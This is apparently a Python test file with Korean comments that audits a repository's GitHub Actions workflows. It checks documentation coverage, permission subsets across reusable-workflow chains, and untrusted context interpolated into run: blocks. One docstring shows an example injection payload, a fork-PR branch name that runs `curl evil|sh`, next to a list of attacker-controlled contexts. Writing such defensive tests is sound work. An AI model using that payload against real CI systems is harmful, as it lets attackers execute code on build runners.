"""워크플로 정합 — 목록과 권한 사슬.

── 왜 생겼나 ───────────────────────────────────────────────────
2026-09-19. 두 사고가 같은 날 났다.

  1. `MASTER §12-7` 「자동으로 도는 것」 표가 **넷을 빠뜨리고 있었다** —
     `navi.yml` · `secret-scan.yml` · `image.yml` · `_deploy.yml`.
     그 절은 「강제자 — tests/test_guards.py 의 트리거 대조」라고 적었는데
     그것은 `contract.yml` 과 `pages.yml` 의 **브랜치 목록만** 본다.
     **범위가 이름보다 좁고 그것이 선언돼 있지 않았다**(PLAN §13 W3-8 · W4-8
     과 같은 족).

  2. 배포 넷이 **하루 동안 죽어 있었다.** 재사용 워크플로는 호출자보다 큰
     권한을 못 가지는데 호출자가 아무것도 선언하지 않았다. 사슬이 셋이라
     (`배포 넷 → _deploy.yml → contract.yml`) 두 칸을 고치자 한 칸 아래에서
     같은 오류가 다시 났다(DECISIONS §196 · §196-4).

**둘 다 정적으로 잴 수 있었다.** 이 파일이 그 둘을 잰다.

★ 인스턴스가 아니라 **클래스**를 본다. 새 워크플로가 생기면 ①이 울고,
  권한을 빠뜨리면 ②가 운다. 목록을 손으로 관리하지 않는다.
"""
from __future__ import annotations

import re
from pathlib import Path

import pytest
from ruamel.yaml import YAML

ROOT = Path(__file__).resolve().parents[1]
WF = ROOT / ".github" / "workflows"
MASTER = ROOT / "docs" / "MASTER.md"

# GitHub 권한 등급. 없으면 none 이다.
LEVEL = {"none": 0, "read": 1, "write": 2}


def _section_12_7() -> str:
    """MASTER §12-7 본문 — 다음 `###` 까지."""
    t = MASTER.read_text(encoding="utf-8")
    m = re.search(r"^### 12-7\. .*?$(.*?)(?=^### )", t, re.M | re.S)
    assert m, "MASTER §12-7 을 못 찾았다"
    return m.group(1)


def test_master_table_lists_every_workflow() -> None:
    """§12-7 표가 `.github/workflows/*.yml` 전수와 같은 집합인가.

    ★ 한 방향이 아니라 **양방향**이다. 빠진 것도, 죽은 것도 결함이다.
    """
    actual = {p.name for p in WF.glob("*.yml")}
    listed = set(re.findall(r"`([\w.-]+\.yml)`", _section_12_7()))

    missing = sorted(actual - listed)
    ghost = sorted(listed - actual)

    assert not missing and not ghost, (
        "MASTER §12-7 「자동으로 도는 것」 표가 실물과 다르다.\n"
        + (f"  표에 없는 실물 {len(missing)}: {missing}\n" if missing else "")
        + (f"  실물에 없는 표 {len(ghost)}: {ghost}\n" if ghost else "")
        + "  워크플로를 더하거나 지우면 그 표도 같이 움직인다.\n"
        + "  표가 낡으면 「무엇이 자동으로 도는가」를 아무도 모른다.")


def _perms(doc: dict) -> dict[str, str]:
    p = doc.get("permissions")
    if p is None:
        return {}
    if isinstance(p, str):          # `permissions: read-all` 류
        return {"*": "write" if p == "write-all" else "read"}
    return {str(k): str(v) for k, v in p.items()}


def _callees(doc: dict) -> list[str]:
    out = []
    for job in (doc.get("jobs") or {}).values():
        if isinstance(job, dict):
            u = job.get("uses")
            if isinstance(u, str) and u.startswith("./.github/workflows/"):
                out.append(u.rsplit("/", 1)[-1])
    return out


def test_reusable_workflow_permissions_are_subsets() -> None:
    """호출자의 권한이 피호출자의 것을 덮는가.

    ★ GitHub 은 재사용 워크플로에 **호출자보다 큰 권한을 주지 않는다.**
      모자라면 경고가 아니라 **파일 무효**이고, 오류는 **맨 위 파일의 줄
      번호**를 가리켜 어디가 진짜인지 읽기 어렵다.
    ★ 사슬은 끝까지 센다. 2026-09-19 에 두 칸만 고쳐 한 칸 아래에서 같은
      오류가 다시 났다.
    """
    yaml = YAML(typ="safe")
    docs: dict[str, dict] = {}
    for p in sorted(WF.glob("*.yml")):
        docs[p.name] = yaml.load(p.read_text(encoding="utf-8")) or {}

    bad: list[str] = []
    for name, doc in docs.items():
        mine = _perms(doc)
        if "*" in mine:
            continue
        for callee in _callees(doc):
            if callee not in docs:
                bad.append(f"  {name} 이 없는 워크플로 {callee} 를 부른다")
                continue
            need = _perms(docs[callee])
            if "*" in need:
                continue
            for key, want in need.items():
                have = mine.get(key, "none")
                if LEVEL.get(want, 0) > LEVEL.get(have, 0):
                    bad.append(
                        f"  {name} → {callee}: `{key}` 가 필요한데 "
                        f"호출자는 `{have}` 다 (필요 `{want}`)")

    assert not bad, (
        "권한 사슬이 끊겼다 — GitHub 이 이 파일을 **무효**로 본다.\n"
        + "\n".join(bad)
        + "\n  재사용 워크플로는 호출자보다 큰 권한을 못 가진다.\n"
        + "  권한은 위임이 안 되므로 **사슬의 모든 칸**이 같은 블록을 든다.\n"
        + "  (DECISIONS §196 · §196-4)")


@pytest.mark.parametrize("name", sorted(p.name for p in WF.glob("*.yml")))
def test_every_workflow_parses(name: str) -> None:
    """파싱되지 않는 워크플로는 조용히 안 돈다."""
    doc = YAML(typ="safe").load((WF / name).read_text(encoding="utf-8"))
    assert isinstance(doc, dict) and doc.get("jobs"), f"{name} 에 jobs 가 없다"


# ★ 2026-09-20 (PLAN §13 W3-15). 공격자가 값을 정할 수 있는 컨텍스트.
#   포크 PR 에서 브랜치 이름 · 제목 · 본문 · 작성자명은 전부 남이 쓴다.
UNTRUSTED = ("github.head_ref", "github.event.pull_request.title",
             "github.event.pull_request.body", "github.event.pull_request.head.ref",
             "github.event.comment.body", "github.event.issue.title",
             "github.event.issue.body", "github.event.head_commit.message")

_RUN_BLOCK = re.compile(r"^(\s+)run:\s*\|?\s*$\n((?:\1\s+.*\n|\s*\n)*)", re.M)


def test_untrusted_context_is_never_interpolated_into_run() -> None:
    """`run:` 안에 **남이 정하는 값**을 `${{ }}` 로 박지 않는가.

    ★ 2026-09-20 실물. `contract.yml` 이 `git fetch … "+${{ github.head_ref }}"`
      를 쓰고 있었다. `${{ }}` 는 **셸이 보기 전에** 치환되므로 따옴표로는
      못 막는다. 포크 PR 의 브랜치 이름이 `a";curl evil|sh;"` 면 그대로 돈다.

    ★ 고치는 법은 `env:` 로 건네고 `"$VAR"` 로 쓰는 것이다. 그러면 값이
      인자로만 남는다. GitHub 권장이고 `actionlint` 의 `expression` 규칙이
      같은 자리를 지목한다 — 이 시험은 그 도구가 없는 기계에서도 든다.

    ★ **인스턴스가 아니라 클래스를 본다.** 한 줄을 고치는 것으로 끝내면
      다음 워크플로가 같은 것을 다시 쓴다(§197-2 와 같은 자리).
    """
    bad = []
    for p in sorted(WF.glob("*.yml")):
        src = p.read_text(encoding="utf-8")
        for m in _RUN_BLOCK.finditer(src):
            body = m.group(2)
            line0 = src[:m.start()].count("\n") + 1
            for k, line in enumerate(body.splitlines()):
                if line.lstrip().startswith("#"):
                    continue
                for ctx in UNTRUSTED:
                    if "${{" in line and ctx in line:
                        bad.append(f"  {p.name}:{line0 + k + 1}  {ctx}  — {line.strip()[:70]}")
    assert not bad, (
        "`run:` 안에 신뢰할 수 없는 값을 직접 보간한다. " + str(len(bad)) + "건\n"
        + "\n".join(bad)
        + "\n\n  `${{ }}` 는 셸이 보기 전에 치환된다 — 따옴표로 못 막는다.\n"
          "  env 로 건네고 \"$VAR\" 로 써라:\n"
          "      env:\n"
          "        HEAD_REF: ${{ github.head_ref }}\n"
          "      run: |\n"
          "        git fetch origin \"+$HEAD_REF\"")
